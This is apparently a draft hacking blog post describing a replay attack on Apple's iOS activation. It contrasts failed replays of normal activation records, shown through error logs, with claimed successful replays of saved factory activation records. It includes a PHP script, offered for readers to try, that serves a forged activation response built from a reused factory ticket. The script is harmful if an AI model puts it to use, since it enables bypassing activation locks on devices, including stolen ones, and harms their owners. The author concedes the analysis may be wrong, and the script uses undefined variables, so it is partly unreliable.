---
title: The activation paradoxon
published: 2025-06-18
description: Apple's activation mechanism is vulnerable to replay attacks, affected iPhones, iPads, iPods, iWatches
tags: [RE, Hax, Apple, iCloud]
category: Hacking
draft: true
---

Read this post on your own risk! The information is based on my own research and my (not-so-good-yet) reverse engineering skills. Thus, this write-up might be incorrect, contains mistakes and turn out partially or completely wrong! Do not trust it blindly and DYOR :\)

---

When it comes to iOS device activation, not all methods are created equal. There are the so called Factory Activation and Albert Activation - both play roles in activating an iPhone e.g. officially or via bypass. While both serve the same fundamental purpose, their security implications vary significantly, particularly when it comes to replay attacks.

In this post, we’ll break down how these activation methods work, why replay attacks are a concern for factory records (but not Albert activations), and what this means for device security. Whether you're a developer, security researcher, or just curious about iOS internals, understanding this "activation paradox" sheds light on Apple's evolving approach to keeping devices secure.

## **Replay attack on albert activation**

When proceeding the normal activation using the default server `https://albert.apple.com/deviceservices/deviceActivation`, we receive an activation record with production signature.

This we can check pretty easy by validating against the known iPhone Activation Certificates which you can find on iOS. These are the typical assigned certificates for the signed components of the record.

- `AccountTokenCertification` -> `iPhoneActivation.pem` (default)
- `AccountTokenSignature` -> `iPhoneActivation.pem` (default)

During the activation, there are performed several checks on several components. For the normal activation, iOS seems to perform more checks than for factory, at least we get the following errors when trying a replay attack:

```
<key>Error</key>
	<string>Failed to activate device. ({
    NSLocalizedDescription = "Failed to activate device.";
    NSUnderlyingError = "Error Domain=com.apple.MobileActivation.ErrorDomain Code=-2 \"Failed to activate device.\" UserInfo={NSLocalizedDescription=Failed to activate device., NSUnderlyingError=0x4ae2e15c0 {Error Domain=com.apple.MobileActivation.ErrorDomain Code=-1 \"Failed to validate activation record with factory certificates.\" UserInfo={NSLocalizedDescription=Failed to validate activation record with factory certificates., NSUnderlyingError=0x4ae2e2790 {Error Domain=com.apple.MobileActivation.ErrorDomain Code=-1 \"Failed to verify activation record certificate.\" UserInfo={NSLocalizedDescription=Failed to verify activation record certificate., NSUnderlyingError=0x4ae2e29a0 {Error Domain=com.apple.MobileActivation.ErrorDomain Code=-1 \"Failed to verify account token signature.\" UserInfo=0x4ae12cac0 (not displayed)}}}}}}";})
    </string>
```

~> `"Failed to verify account token signature."`

or

```
<key>Error</key>
	<string>Failed to activate device. ({
    NSLocalizedDescription = "Failed to activate device.";
    NSUnderlyingError = "Error Domain=com.apple.MobileActivation.ErrorDomain Code=-2 \"Failed to activate device.\" UserInfo={NSLocalizedDescription=Failed to activate device., NSUnderlyingError=0x4ae2e03f0 {Error Domain=com.apple.MobileActivation.ErrorDomain Code=-1 \"Failed to validate activation record with factory certificates.\" UserInfo={NSLocalizedDescription=Failed to validate activation record with factory certificates., NSUnderlyingError=0x4ae2e00f0 {Error Domain=com.apple.MobileActivation.ErrorDomain Code=-1 \"Failed to verify activation record certificate.\" UserInfo={NSLocalizedDescription=Failed to verify activation record certificate., NSUnderlyingError=0x4ae2e15c0 {Error Domain=com.apple.MobileActivation.ErrorDomain Code=-1 \"UCRT public key does not match UIK public key.\" UserInfo=0x4ae12d800 (not displayed)}}}}}}";})
    </string>
```

~> `"UCRT public key does not match UIK public key."`

## **Replay attack on factory activation**

When proceeding the factory activation using a presaved factory record, we get a different result of activation :) The device successfully activates.

Other than the albert activation, the signature of the AccountToken is made via RaptorActivation certificate. When the first activation try fails to validate internally against the iPhoneActivation certificates, it switches to FactoryActivation certificates for validation - and succeeds as the checks performed here are much less than albert.

- `AccountTokenCertification` -> `iPhoneActivation.pem` (default)
- `AccountTokenSignature` -> `RaptorActivation.pem` (*factory*)

If you are wanna try this yourself, just use this basic php script to do so, just paste the components of your factory ticket into the script

```php
<?php

require('CFPropertyList/CFPropertyList.php'); 
require_once('vendor/autoload.php');

$debug=false;
if($debug==true)
{ 
	ini_set('display_errors', 1);
	ini_set('display_startup_errors', 1);
	error_reporting(E_ALL);
}

error_reporting(0);
set_time_limit(0);

if(!isset($_POST['activation-info']) || empty($_POST['activation-info'])) { exit('Method not implemented'); }
if(isset($_POST['activation-info'])) {

    $response =
    '<plist version="1.0">
      <dict>
        <key>'.($deviceClass == "iPhone" ? 'iphone' : 'device').'-activation</key>
        <dict>
          <key>activation-record</key>
          <dict>
            <key>unbrick</key>
            <true/>
            <key>AccountToken</key>
            <data>
            ---AccountToken of your factory ticket---
            </data>
            <key>AccountTokenCertificate</key>
            <data>
            ---AccountTokenCertificate of your factory ticket---
            </data>
            <key>AccountTokenSignature</key>
            <data>
            ---AccountTokenSignature of your factory ticket---
            </data>
            <key>DeviceCertificate</key>
            <data>
            ---DeviceCertificate of your factory ticket---
            </data>
            <key>FairPlayKeyData</key>
            <data>
            ---FairPlayKeyData of your factory ticket---
            </data>
            <key>LDActivationVersion</key>
            <integer>2</integer>
            <key>RegulatoryInfo</key>
            <data>eyJtYW51ZmFjdHVyaW5nRGF0ZSI6bnVsbCwiZWxhYmVsIjp7ImJpcyI6bnVsbCwibWlpdCI6eyJuYWwiOm51bGwsImxhYmVsSWQiOm51bGx9fSwiY291bnRyeU9mT3JpZ2luIjpudWxsfQ==</data>
          </dict>
          <key>show-settings</key>
          <true/>
        </dict>
      </dict>
    </plist>';

    header("ARS: ".base64_encode(hex2bin(hash("sha1", $activation))));
    header('Content-type: application/xml');
    header('Content-Length: '.strlen($response));
    echo $response;

}
```

---

## Disclaimer

This writeup is for **educational purposes only**.

- Do **not** use this for illegal activities.
- Apple may patch this behavior at any time.



© 2025  ~ Hana Kim